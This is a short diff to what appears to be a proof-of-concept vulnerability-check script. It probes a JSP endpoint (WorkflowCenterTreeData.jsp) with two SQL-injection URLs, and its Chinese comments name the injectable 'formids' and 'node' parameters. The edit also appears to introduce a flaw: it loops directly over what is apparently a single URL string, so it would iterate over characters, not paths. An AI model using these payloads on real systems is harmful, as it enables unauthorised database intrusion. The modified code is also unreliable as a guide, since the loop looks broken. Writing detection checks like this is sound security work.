@@ -21,17 +21,12 @@ class POC(Script):
     async def prove(self):
         await self.get_url()
         if self.base_url:
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/'),
-                self.url_normpath(self.url, './'),
-            ]))
             pocs  = ["mobile/plugin/browser/WorkflowCenterTreeData.jsp?scope=1&node=root_1&formids=1/1&initvalue=1", # 注入点为formids,分母
                      "mobile/plugin/browser/WorkflowCenterTreeData.jsp?scope=1&node=wftype_6/1&formids=1&initvalue=1"] # 注入点为node,分母
             async with ClientSession() as session:
-                for path in path_list:
+                for path in self.url_normpath(self.url, './'):
                     for poc in pocs :
                         url = path + poc
-
                         async with session.get(url=url) as res:
                             if res!=None:
                                 text = await res.text()
